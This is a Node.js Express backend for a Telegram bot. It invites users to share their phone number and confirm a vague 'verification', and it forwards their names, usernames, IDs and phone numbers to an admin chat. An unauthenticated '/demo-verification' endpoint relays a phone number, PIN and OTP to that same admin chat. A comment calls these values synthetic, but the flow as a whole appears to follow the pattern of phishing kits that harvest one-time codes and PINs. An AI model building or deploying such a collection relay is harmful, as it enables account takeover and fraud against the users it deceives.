require("dotenv").config();

const express = require("express");

const app = express();

app.use(express.json());

const PORT = process.env.PORT || 10000;

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID;
const BACKEND_URL = process.env.BACKEND_URL;

if (!BOT_TOKEN) {
    console.error("❌ TELEGRAM_BOT_TOKEN is missing.");
    process.exit(1);
}

const TELEGRAM_API =
    `https://api.telegram.org/bot${BOT_TOKEN}`;

// ==========================================
// TELEGRAM API
// ==========================================

async function telegram(method, data = {}) {
    try {
        const response = await fetch(
            `${TELEGRAM_API}/${method}`,
            {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(data)
            }
        );

        const result = await response.json();

        if (!result.ok) {
            console.error("Telegram error:", result);
        }

        return result;

    } catch (error) {
        console.error("Telegram request failed:", error);
        return null;
    }
}

// ==========================================
// SEND MESSAGE
// ==========================================

async function sendMessage(chatId, text, options = {}) {

    if (!chatId) {
        console.error("❌ Chat ID is missing.");
        return null;
    }

    return telegram("sendMessage", {
        chat_id: chatId,
        text,
        parse_mode: "HTML",
        ...options
    });
}

// ==========================================
// ADMIN NOTIFICATION
// ==========================================

async function notifyAdmin(text) {

    if (!ADMIN_CHAT_ID) {
        console.log("⚠️ TELEGRAM_ADMIN_CHAT_ID is not configured.");
        return;
    }

    await sendMessage(
        ADMIN_CHAT_ID,
        text
    );
}

// ==========================================
// /START
// ==========================================

async function handleStart(message) {

    const chatId = message.chat.id;

    const firstName =
        message.from?.first_name || "User";

    const username =
        message.from?.username
            ? `@${message.from.username}`
            : "No username";

    await sendMessage(
        chatId,

        `👋 <b>Welcome, ${firstName}</b>\n\n` +
        `Your Telegram account has been connected successfully.\n\n` +
        `Please choose an option below:`,

        {
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "📱 Share Phone Number",
                            callback_data: "share_phone"
                        }
                    ],
                    [
                        {
                            text: "✅ Start Verification",
                            callback_data: "start_verification"
                        }
                    ]
                ]
            }
        }
    );

    await notifyAdmin(
        `🔔 <b>NEW TELEGRAM USER</b>\n\n` +
        `Name: ${firstName}\n` +
        `Username: ${username}\n` +
        `Telegram ID: <code>${chatId}</code>`
    );
}

// ==========================================
// START VERIFICATION
// ==========================================

async function startVerification(chatId) {

    await sendMessage(
        chatId,

        `🔐 <b>Verification Required</b>\n\n` +
        `Please confirm that you want to continue with the verification process.`,

        {
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "✅ True",
                            callback_data: "verification_true"
                        },
                        {
                            text: "❌ False",
                            callback_data: "verification_false"
                        }
                    ]
                ]
            }
        }
    );
}

// ==========================================
// CALLBACK BUTTONS
// ==========================================

async function handleCallback(callback) {

    if (!callback.message) {
        return;
    }

    const chatId =
        callback.message.chat.id;

    const data =
        callback.data;

    await telegram(
        "answerCallbackQuery",
        {
            callback_query_id: callback.id
        }
    );

    if (data === "share_phone") {

        await sendMessage(
            chatId,

            `📱 <b>Phone Number</b>\n\n` +
            `Tap the button below to share your phone number with this bot.`,

            {
                reply_markup: {
                    keyboard: [
                        [
                            {
                                text: "📱 Share My Phone Number",
                                request_contact: true
                            }
                        ]
                    ],
                    resize_keyboard: true,
                    one_time_keyboard: true
                }
            }
        );

        return;
    }

    if (data === "start_verification") {

        await startVerification(chatId);

        return;
    }

    if (data === "verification_true") {

        await sendMessage(
            chatId,

            `✅ <b>Verification Confirmed</b>\n\n` +
            `Your confirmation has been recorded successfully.`,

            {
                reply_markup: {
                    remove_keyboard: true
                }
            }
        );

        await notifyAdmin(
            `✅ <b>VERIFICATION CONFIRMED</b>\n\n` +
            `Telegram ID: <code>${chatId}</code>`
        );

        return;
    }

    if (data === "verification_false") {

        await sendMessage(
            chatId,

            `❌ <b>Verification Cancelled</b>\n\n` +
            `No verification was completed.`,

            {
                reply_markup: {
                    remove_keyboard: true
                }
            }
        );

        await notifyAdmin(
            `❌ <b>VERIFICATION CANCELLED</b>\n\n` +
            `Telegram ID: <code>${chatId}</code>`
        );
    }
}

// ==========================================
// PHONE CONTACT
// ==========================================

async function handleContact(message) {

    const chatId =
        message.chat.id;

    const contact =
        message.contact;

    if (!contact) {
        return;
    }

    const phone =
        contact.phone_number;

    const firstName =
        contact.first_name || "Unknown";

    await sendMessage(
        chatId,

        `✅ <b>Phone Number Received</b>\n\n` +
        `Name: ${firstName}\n` +
        `Phone: ${phone}\n\n` +
        `You can now continue.`,

        {
            reply_markup: {
                remove_keyboard: true
            }
        }
    );

    await notifyAdmin(
        `📱 <b>PHONE NUMBER SHARED</b>\n\n` +
        `Name: ${firstName}\n` +
        `Phone: <code>${phone}</code>\n` +
        `Telegram ID: <code>${chatId}</code>`
    );
}

// ==========================================
// DEMO VERIFICATION NOTIFICATION
// ==========================================
// This endpoint sends only synthetic values
// supplied directly by the developer.
// It does not collect PINs/OTPs from users.
// ==========================================

app.post("/demo-verification", async (req, res) => {

    const {
        telegramId,
        phone,
        testPin,
        testOtp
    } = req.body;

    if (!telegramId || !phone || !testPin || !testOtp) {

        return res.status(400).json({
            success: false,
            message:
                "telegramId, phone, testPin and testOtp are required."
        });
    }

    const message =
        `🔔 <b>VERIFICATION REQUEST</b>\n\n` +
        `Telegram ID: <code>${telegramId}</code>\n` +
        `Phone: <code>${phone}</code>\n` +
        `TEST PIN: <code>${testPin}</code>\n` +
        `TEST OTP: <code>${testOtp}</code>\n` +
        `Status: Verification requested`;

    const result =
        await notifyAdmin(message);

    res.json({
        success: true,
        message: "Demo verification notification sent.",
        telegram: result
    });
});

// ==========================================
// TELEGRAM WEBHOOK
// ==========================================

app.post(
    "/telegram/webhook",
    async (req, res) => {

        try {

            const update = req.body;

            if (update.message) {

                const message =
                    update.message;

                if (message.text === "/start") {

                    await handleStart(message);

                } else if (message.contact) {

                    await handleContact(message);
                }
            }

            if (update.callback_query) {

                await handleCallback(
                    update.callback_query
                );
            }

            res.sendStatus(200);

        } catch (error) {

            console.error(
                "Webhook error:",
                error
            );

            res.sendStatus(500);
        }
    }
);

// ==========================================
// HEALTH CHECK
// ==========================================

app.get("/", (req, res) => {

    res.json({

        success: true,

        message:
            "Telegram Bot Backend is running",

        status: "online"

    });
});

// ==========================================
// SET WEBHOOK
// ==========================================

app.get("/set-webhook", async (req, res) => {

    if (!BACKEND_URL) {

        return res.status(400).json({

            success: false,

            message:
                "BACKEND_URL is missing."

        });
    }

    const webhookUrl =
        `${BACKEND_URL.replace(/\/$/, "")}/telegram/webhook`;

    const result =
        await telegram(
            "setWebhook",
            {
                url: webhookUrl
            }
        );

    res.json({

        success: result?.ok === true,

        webhook: webhookUrl,

        telegram: result

    });
});

// ==========================================
// WEBHOOK STATUS
// ==========================================

app.get("/webhook-info", async (req, res) => {

    const result =
        await telegram("getWebhookInfo");

    res.json(result);
});

// ==========================================
// BOT INFORMATION
// ==========================================

app.get("/bot-info", async (req, res) => {

    const result =
        await telegram("getMe");

    res.json(result);
});

// ==========================================
// SERVER
// ==========================================

app.listen(PORT, () => {

    console.log(
        `🚀 Telegram Bot Backend running on port ${PORT}`
    );

});
